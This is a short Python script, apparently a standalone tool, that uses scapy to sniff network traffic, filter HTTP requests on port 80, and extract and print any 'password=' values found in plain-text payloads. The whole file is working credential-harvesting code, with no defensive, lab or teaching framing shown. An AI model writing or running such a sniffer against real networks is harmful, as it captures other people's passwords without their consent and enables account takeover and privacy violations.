from scapy.all import *
from scapy.layers.inet import TCP


def packet_handler(packet):
    if packet.haslayer(TCP) and packet[TCP].dport == 80:
        # Check if the packet has a payload
        if packet.haslayer(Raw):
            payload = packet[Raw].load.decode('utf-8', errors='ignore')

            # Check if the payload contains the password
            if 'password' in payload:
                password_index = payload.index('password')

                # Extract the password from the payload
                password_line = payload[password_index:].split('\n', 1)[0]
                password_value = password_line.split('=', 1)
                if len(password_value) > 1:
                    password = password_value[1].split('&', 1)[0] if '&' in password_value[1] else password_value[1]
                    print("Password found:", password)


# Sniff packets on the network interface
print("Sniffer started...")
sniff(filter="tcp", prn=packet_handler)
